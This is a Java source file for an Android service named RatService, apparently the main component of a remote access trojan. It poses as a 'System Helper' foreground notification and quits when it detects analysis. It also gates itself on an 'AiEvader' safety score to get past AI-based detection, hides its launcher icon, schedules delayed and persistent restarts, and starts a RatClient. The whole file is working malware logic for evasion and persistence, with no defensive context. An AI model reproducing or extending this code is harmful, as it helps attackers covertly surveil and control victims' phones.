package com.syshelper.service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import java.util.concurrent.TimeUnit;

public class RatService extends Service {
    private RatClient client;

    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("rat", "Service", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1337, new Notification.Builder(this, "rat")
            .setContentTitle("System Helper").setContentText("Monitoring")
            .setSmallIcon(android.R.drawable.ic_menu_info_details).setOngoing(true).build());

        new Thread(() -> {
            if (!AntiAnalysis.isSafe(this)) { stopSelf(); return; }
            if (!AiEvader.isWarmedUp(this)) {
                PeriodicWorkRequest warmup = new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES).build();
                WorkManager.getInstance(this).enqueue(warmup);
                stopSelf(); return;
            }
            if (AiEvader.getSafetyScore(this) < 60) {
                PeriodicWorkRequest retry = new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES).build();
                WorkManager.getInstance(this).enqueue(retry);
                stopSelf(); return;
            }
            IconHider.applyManufacturerHiding(this);
            DelayedStart.scheduleDelayedStart(this, RatService.class);
            client = new RatClient(this);
            client.start();
            PeriodicWorkRequest heartbeat = new PeriodicWorkRequest.Builder(HeartbeatWorker.class, 15, TimeUnit.MINUTES).build();
            WorkManager.getInstance(this).enqueue(heartbeat);
        }).start();
    }

    @Override public int onStartCommand(Intent intent, int flags, int startId) { return START_STICKY; }
    @Override public void onDestroy() { super.onDestroy(); if (client != null) client.stop(); }
    @Override public IBinder onBind(Intent intent) { return null; }
}
